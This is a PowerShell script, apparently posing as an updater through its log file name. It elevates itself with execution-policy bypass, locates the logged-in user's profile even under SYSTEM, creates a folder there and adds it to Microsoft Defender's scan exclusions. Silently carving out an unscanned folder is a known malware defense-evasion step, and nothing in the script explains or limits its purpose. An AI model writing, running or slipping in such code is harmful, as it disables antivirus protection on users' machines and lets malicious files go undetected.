# Define a log file path
$logPath = "C:\Windows\Temp\updater_log.txt"

function Write-Log {
    param ($msg)
    $timestamp = "[{0}] $msg" -f (Get-Date -Format "yyyy-MM-dd HH:mm:ss")
    $timestamp | Out-File -FilePath $logPath -Append -Encoding utf8
}

# Re-run as admin if needed
$currentIdentity = [Security.Principal.WindowsIdentity]::GetCurrent()
$principal = New-Object Security.Principal.WindowsPrincipal($currentIdentity)
if (-not $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Log "Not running as admin. Relaunching with elevation..."
    Start-Process powershell.exe -Verb RunAs -ArgumentList "-ExecutionPolicy Bypass -File `"$PSCommandPath`""
    exit
}

Write-Log "Running as admin. Attempting to add exclusions..."

# Dynamically detect real user folder (works even when running as SYSTEM)
function Get-RealUserProfile {
    try {
        $explorerProc = Get-Process explorer -ErrorAction Stop | Select-Object -First 1
        $owner = (Get-CimInstance Win32_Process -Filter "ProcessId = $($explorerProc.Id)").GetOwner().User
        $profile = (Get-CimInstance -Class Win32_UserProfile | Where-Object { $_.LocalPath -like "C:\Users\$owner" }).LocalPath
        return $profile
    } catch {
        return $env:USERPROFILE  # fallback if detection fails
    }
}

$realUserProfile = Get-RealUserProfile
$foldersToEnsure = @("$realUserProfile\TestSafeFolder")

foreach ($folder in $foldersToEnsure) {
    if (-not (Test-Path $folder)) {
        New-Item -ItemType Directory -Path $folder -Force | Out-Null
        Write-Log "Created folder: $folder"
    }

    try {
        Add-MpPreference -ExclusionPath $folder -ErrorAction Stop
        Write-Log "Added exclusion: $folder"
    } catch {
        Write-Log "Exclusion may already exist or failed: $folder. Error: $_"
    }
}
